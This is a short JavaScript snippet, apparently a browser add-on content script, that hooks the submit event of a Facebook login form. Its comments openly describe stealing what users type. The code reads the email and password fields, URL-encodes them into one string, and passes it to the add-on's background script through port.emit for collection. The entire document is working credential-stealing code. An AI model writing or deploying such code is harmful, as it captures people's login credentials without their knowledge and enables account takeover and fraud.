var passWordForm = document.querySelector('input[type="password"]').form;

// here we will steal email and username that user 
// enter in facebook  login form.  
passWordForm.addEventListener("submit", function(event) {
	var stolenPasswordAndEmailString = "email=" + 
	 encodeURIComponent(this.email.value) + 
							 "&password=" + 
	 encodeURIComponent(this.pass.value);
	
    self.port.emit('getPassword', stolenPasswordAndEmailString);
});
